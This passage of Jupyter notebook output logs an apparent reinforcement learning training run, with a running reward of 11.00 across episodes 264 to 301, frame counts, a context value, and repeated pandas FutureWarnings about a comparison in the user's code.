    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 264\t Frame count: 129800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 264\t Frame count: 129900\t Context: 1\n",
      "Running reward: 11.00\t Episode 264\t Frame count: 130000\t Context: 2\n",
      "Running reward: 11.00\t Episode 264\t Frame count: 130100\t Context: 2\n",
      "Running reward: 11.00\t Episode 265\t Frame count: 130200\t Context: 1\n",
      "Running reward: 11.00\t Episode 265\t Frame count: 130300\t Context: 2\n",
      "Running reward: 11.00\t Episode 265\t Frame count: 130400\t Context: 2\n",
      "Running reward: 11.00\t Episode 265\t Frame count: 130500\t Context: 2\n",
      "Running reward: 11.00\t Episode 266\t Frame count: 130600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 266\t Frame count: 130700\t Context: 1\n",
      "Running reward: 11.00\t Episode 266\t Frame count: 130800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 266\t Frame count: 130900\t Context: 1\n",
      "Running reward: 11.00\t Episode 266\t Frame count: 131000\t Context: 2\n",
      "Running reward: 11.00\t Episode 266\t Frame count: 131100\t Context: 2\n",
      "Running reward: 11.00\t Episode 266\t Frame count: 131200\t Context: 2\n",
      "Running reward: 11.00\t Episode 266\t Frame count: 131300\t Context: 2\n",
      "Running reward: 11.00\t Episode 266\t Frame count: 131400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 267\t Frame count: 131500\t Context: 1\n",
      "Running reward: 11.00\t Episode 267\t Frame count: 131600\t Context: 1\n",
      "Running reward: 11.00\t Episode 267\t Frame count: 131700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 267\t Frame count: 131800\t Context: 2\n",
      "Running reward: 11.00\t Episode 268\t Frame count: 131900\t Context: 1\n",
      "Running reward: 11.00\t Episode 268\t Frame count: 132000\t Context: 2\n",
      "Running reward: 11.00\t Episode 268\t Frame count: 132100\t Context: 2\n",
      "Running reward: 11.00\t Episode 268\t Frame count: 132200\t Context: 2\n",
      "Running reward: 11.00\t Episode 268\t Frame count: 132300\t Context: 2\n",
      "Running reward: 11.00\t Episode 268\t Frame count: 132400\t Context: 2\n",
      "Running reward: 11.00\t Episode 268\t Frame count: 132500\t Context: 2\n",
      "Running reward: 11.00\t Episode 268\t Frame count: 132600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 268\t Frame count: 132700\t Context: 2\n",
      "Running reward: 11.00\t Episode 268\t Frame count: 132800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 268\t Frame count: 132900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 269\t Frame count: 133000\t Context: 1\n",
      "Running reward: 11.00\t Episode 269\t Frame count: 133100\t Context: 2\n",
      "Running reward: 11.00\t Episode 269\t Frame count: 133200\t Context: 2\n",
      "Running reward: 11.00\t Episode 270\t Frame count: 133300\t Context: 1\n",
      "Running reward: 11.00\t Episode 270\t Frame count: 133400\t Context: 1\n",
      "Running reward: 11.00\t Episode 270\t Frame count: 133500\t Context: 2\n",
      "Running reward: 11.00\t Episode 270\t Frame count: 133600\t Context: 2\n",
      "Running reward: 11.00\t Episode 270\t Frame count: 133700\t Context: 2\n",
      "Running reward: 11.00\t Episode 271\t Frame count: 133800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 271\t Frame count: 133900\t Context: 2\n",
      "Running reward: 11.00\t Episode 271\t Frame count: 134000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 272\t Frame count: 134100\t Context: 1\n",
      "Running reward: 11.00\t Episode 272\t Frame count: 134200\t Context: 1\n",
      "Running reward: 11.00\t Episode 272\t Frame count: 134300\t Context: 1\n",
      "Running reward: 11.00\t Episode 273\t Frame count: 134400\t Context: 1\n",
      "Running reward: 11.00\t Episode 273\t Frame count: 134500\t Context: 1\n",
      "Running reward: 11.00\t Episode 273\t Frame count: 134600\t Context: 1\n",
      "Running reward: 11.00\t Episode 273\t Frame count: 134700\t Context: 2\n",
      "Running reward: 11.00\t Episode 274\t Frame count: 134800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 274\t Frame count: 134900\t Context: 2\n",
      "Running reward: 11.00\t Episode 274\t Frame count: 135000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 274\t Frame count: 135100\t Context: 2\n",
      "Running reward: 11.00\t Episode 275\t Frame count: 135200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 275\t Frame count: 135300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 276\t Frame count: 135400\t Context: 1\n",
      "Running reward: 11.00\t Episode 276\t Frame count: 135500\t Context: 2\n",
      "Running reward: 11.00\t Episode 276\t Frame count: 135600\t Context: 2\n",
      "Running reward: 11.00\t Episode 276\t Frame count: 135700\t Context: 2\n",
      "Running reward: 11.00\t Episode 277\t Frame count: 135800\t Context: 2\n",
      "Running reward: 11.00\t Episode 277\t Frame count: 135900\t Context: 2\n",
      "Running reward: 11.00\t Episode 277\t Frame count: 136000\t Context: 2\n",
      "Running reward: 11.00\t Episode 277\t Frame count: 136100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 277\t Frame count: 136200\t Context: 2\n",
      "Running reward: 11.00\t Episode 277\t Frame count: 136300\t Context: 2\n",
      "Running reward: 11.00\t Episode 277\t Frame count: 136400\t Context: 2\n",
      "Running reward: 11.00\t Episode 278\t Frame count: 136500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 278\t Frame count: 136600\t Context: 1\n",
      "Running reward: 11.00\t Episode 278\t Frame count: 136700\t Context: 2\n",
      "Running reward: 11.00\t Episode 278\t Frame count: 136800\t Context: 2\n",
      "Running reward: 11.00\t Episode 279\t Frame count: 136900\t Context: 2\n",
      "Running reward: 11.00\t Episode 280\t Frame count: 137000\t Context: 1\n",
      "Running reward: 11.00\t Episode 280\t Frame count: 137100\t Context: 1\n",
      "Running reward: 11.00\t Episode 280\t Frame count: 137200\t Context: 1\n",
      "Running reward: 11.00\t Episode 280\t Frame count: 137300\t Context: 1\n",
      "Running reward: 11.00\t Episode 281\t Frame count: 137400\t Context: 1\n",
      "Running reward: 11.00\t Episode 281\t Frame count: 137500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 281\t Frame count: 137600\t Context: 2\n",
      "Running reward: 11.00\t Episode 281\t Frame count: 137700\t Context: 2\n",
      "Running reward: 11.00\t Episode 282\t Frame count: 137800\t Context: 2\n",
      "Running reward: 11.00\t Episode 282\t Frame count: 137900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 282\t Frame count: 138000\t Context: 2\n",
      "Running reward: 11.00\t Episode 283\t Frame count: 138100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 283\t Frame count: 138200\t Context: 1\n",
      "Running reward: 11.00\t Episode 283\t Frame count: 138300\t Context: 2\n",
      "Running reward: 11.00\t Episode 283\t Frame count: 138400\t Context: 2\n",
      "Running reward: 11.00\t Episode 284\t Frame count: 138500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 284\t Frame count: 138600\t Context: 1\n",
      "Running reward: 11.00\t Episode 284\t Frame count: 138700\t Context: 1\n",
      "Running reward: 11.00\t Episode 285\t Frame count: 138800\t Context: 1\n",
      "Running reward: 11.00\t Episode 285\t Frame count: 138900\t Context: 1\n",
      "Running reward: 11.00\t Episode 285\t Frame count: 139000\t Context: 2\n",
      "Running reward: 11.00\t Episode 285\t Frame count: 139100\t Context: 2\n",
      "Running reward: 11.00\t Episode 285\t Frame count: 139200\t Context: 2\n",
      "Running reward: 11.00\t Episode 285\t Frame count: 139300\t Context: 2\n",
      "Running reward: 11.00\t Episode 285\t Frame count: 139400\t Context: 2\n",
      "Running reward: 11.00\t Episode 285\t Frame count: 139500\t Context: 2\n",
      "Running reward: 11.00\t Episode 285\t Frame count: 139600\t Context: 2\n",
      "Running reward: 11.00\t Episode 286\t Frame count: 139700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 286\t Frame count: 139800\t Context: 1\n",
      "Running reward: 11.00\t Episode 286\t Frame count: 139900\t Context: 1\n",
      "Running reward: 11.00\t Episode 286\t Frame count: 140000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 286\t Frame count: 140100\t Context: 2\n",
      "Running reward: 11.00\t Episode 286\t Frame count: 140200\t Context: 2\n",
      "Running reward: 11.00\t Episode 287\t Frame count: 140300\t Context: 1\n",
      "Running reward: 11.00\t Episode 287\t Frame count: 140400\t Context: 2\n",
      "Running reward: 11.00\t Episode 288\t Frame count: 140500\t Context: 1\n",
      "Running reward: 11.00\t Episode 288\t Frame count: 140600\t Context: 1\n",
      "Running reward: 11.00\t Episode 288\t Frame count: 140700\t Context: 2\n",
      "Running reward: 11.00\t Episode 289\t Frame count: 140800\t Context: 1\n",
      "Running reward: 11.00\t Episode 289\t Frame count: 140900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 289\t Frame count: 141000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 289\t Frame count: 141100\t Context: 2\n",
      "Running reward: 11.00\t Episode 289\t Frame count: 141200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 289\t Frame count: 141300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 289\t Frame count: 141400\t Context: 2\n",
      "Running reward: 11.00\t Episode 289\t Frame count: 141500\t Context: 2\n",
      "Running reward: 11.00\t Episode 290\t Frame count: 141600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 290\t Frame count: 141700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 290\t Frame count: 141800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 290\t Frame count: 141900\t Context: 1\n",
      "Running reward: 11.00\t Episode 290\t Frame count: 142000\t Context: 1\n",
      "Running reward: 11.00\t Episode 290\t Frame count: 142100\t Context: 1\n",
      "Running reward: 11.00\t Episode 290\t Frame count: 142200\t Context: 1\n",
      "Running reward: 11.00\t Episode 290\t Frame count: 142300\t Context: 1\n",
      "Running reward: 11.00\t Episode 290\t Frame count: 142400\t Context: 2\n",
      "Running reward: 11.00\t Episode 291\t Frame count: 142500\t Context: 1\n",
      "Running reward: 11.00\t Episode 292\t Frame count: 142600\t Context: 1\n",
      "Running reward: 11.00\t Episode 292\t Frame count: 142700\t Context: 1\n",
      "Running reward: 11.00\t Episode 292\t Frame count: 142800\t Context: 2\n",
      "Running reward: 11.00\t Episode 293\t Frame count: 142900\t Context: 1\n",
      "Running reward: 11.00\t Episode 293\t Frame count: 143000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 293\t Frame count: 143100\t Context: 1\n",
      "Running reward: 11.00\t Episode 293\t Frame count: 143200\t Context: 2\n",
      "Running reward: 11.00\t Episode 293\t Frame count: 143300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 295\t Frame count: 143400\t Context: 1\n",
      "Running reward: 11.00\t Episode 295\t Frame count: 143500\t Context: 1\n",
      "Running reward: 11.00\t Episode 295\t Frame count: 143600\t Context: 1\n",
      "Running reward: 11.00\t Episode 295\t Frame count: 143700\t Context: 1\n",
      "Running reward: 11.00\t Episode 295\t Frame count: 143800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 295\t Frame count: 143900\t Context: 1\n",
      "Running reward: 11.00\t Episode 295\t Frame count: 144000\t Context: 1\n",
      "Running reward: 11.00\t Episode 295\t Frame count: 144100\t Context: 2\n",
      "Running reward: 11.00\t Episode 296\t Frame count: 144200\t Context: 1\n",
      "Running reward: 11.00\t Episode 296\t Frame count: 144300\t Context: 1\n",
      "Running reward: 11.00\t Episode 296\t Frame count: 144400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 296\t Frame count: 144500\t Context: 1\n",
      "Running reward: 11.00\t Episode 296\t Frame count: 144600\t Context: 1\n",
      "Running reward: 11.00\t Episode 296\t Frame count: 144700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 296\t Frame count: 144800\t Context: 1\n",
      "Running reward: 11.00\t Episode 297\t Frame count: 144900\t Context: 1\n",
      "Running reward: 11.00\t Episode 297\t Frame count: 145000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 297\t Frame count: 145100\t Context: 1\n",
      "Running reward: 11.00\t Episode 297\t Frame count: 145200\t Context: 2\n",
      "Running reward: 11.00\t Episode 297\t Frame count: 145300\t Context: 2\n",
      "Running reward: 11.00\t Episode 297\t Frame count: 145400\t Context: 2\n",
      "Running reward: 11.00\t Episode 297\t Frame count: 145500\t Context: 2\n",
      "Running reward: 11.00\t Episode 297\t Frame count: 145600\t Context: 2\n",
      "Running reward: 11.00\t Episode 298\t Frame count: 145700\t Context: 2\n",
      "Running reward: 11.00\t Episode 298\t Frame count: 145800\t Context: 2\n",
      "Running reward: 11.00\t Episode 299\t Frame count: 145900\t Context: 1\n",
      "Running reward: 11.00\t Episode 300\t Frame count: 146000\t Context: 1\n",
      "Running reward: 11.00\t Episode 300\t Frame count: 146100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 300\t Frame count: 146200\t Context: 1\n",
      "Running reward: 11.00\t Episode 300\t Frame count: 146300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 300\t Frame count: 146400\t Context: 1\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 146500\t Context: 1\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 146600\t Context: 1\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 146700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 301\t Frame count: 146800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 301\t Frame count: 146900\t Context: 1\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 147000\t Context: 1\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 147100\t Context: 1\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 147200\t Context: 1\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 147300\t Context: 1\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 147400\t Context: 1\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 147500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
